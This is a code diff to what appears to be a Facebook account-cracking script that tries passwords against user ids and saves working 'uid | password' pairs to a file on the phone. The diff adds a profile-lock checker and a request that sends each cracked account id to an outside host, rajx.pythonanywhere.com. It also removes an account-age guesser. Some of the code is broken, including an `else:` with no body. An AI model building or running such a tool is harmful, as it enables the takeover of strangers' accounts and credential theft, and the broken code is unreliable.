@@ -190,40 +190,17 @@ for xd in range(10000):
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)
     
+#-------checker------#
+def lock_check(uid):
+    sessionx=requests.Session()
+    urlx=f'https://www.facebook.com/p/{uid}'
+    req=BeautifulSoup(sessionx.get(urlx).content,'html.parser')
+    tx=req.find('title').text
+    if tx =='Facebook':
+        return('LOCK')
+    else:
+        return('LIVE')
 
-def samiya(uid):
-    if len(uid)==15:l
-        elif uid[:10] in ['1000000000']       :shanto = ' √ 2009'
-        elif uid[:9] in ['100000000']       :shanto = '√ 2009'
-        elif uid[:8] in ['10000000']        :shanto = '√ 2009'
-        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:shanto = '√ 2009'
-        elif uid[:7] in ['1000006','1000007','1000008','1000009']:shanto = ' 2010'
-        elif uid[:6] in ['100001']          :shanto = '√ 2010/2011'
-        elif uid[:6] in ['100002','100003'] :shanto = '√ 2011/2012'
-        elif uid[:6] in ['100004']          :shanto = '√ 2012/2013'
-        elif uid[:6] in ['100005','100006'] :shanto = '√ 2013/2014'
-        elif uid[:6] in ['100007','100008'] :shanto = '√ 2014/2015'
-        elif uid[:6] in ['100009']          :shanto = '√ 2015'
-        elif uid[:5] in ['10001']           :shanto = '√ 2015/2016'
-        elif uid[:5] in ['10002']           :shanto = '√ 2016/2017'
-        elif uid[:5] in ['10003']           :shanto = '√ 2018/2019'
-        elif uid[:5] in ['10004']           :shanto = '√ 2019/2020'
-        elif uid[:5] in ['10005']           :shanto = '√ 2020'
-        elif uid[:5] in ['10006','10007','']:shanto = '√ 2021'
-        elif uid[:5] in ['10008']           :shanto = '√ 2022'
-        elif uid[:5] in ['10009']           :shanto = '√ 2023'
-        else:shanto=''
-    elif len(uid) in [9,10]:
-        shanto = ' √ 2008/2009'
-    elif len(uid)==8:
-        shanto = '√ 2007/2008'
-    elif len(uid)==7:
-        shanto = '√ 2006/2007'
-    else:shanto=''
-    return shanto
-    
-    
-    
 # APK CHECK
 def xxr():
     user=[]
@@ -325,7 +302,11 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\r\r\33[1;31m [HASAN-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                res = requests.get(f"https://rajx.pythonanywhere.com/live/uid={cid}").text
+                if 'LOCK' in res:
+                    return 'LOCK'
+                else:
+                print('\r\r\33[1;31m [HASAN-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                 open('/sdcard/HASAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
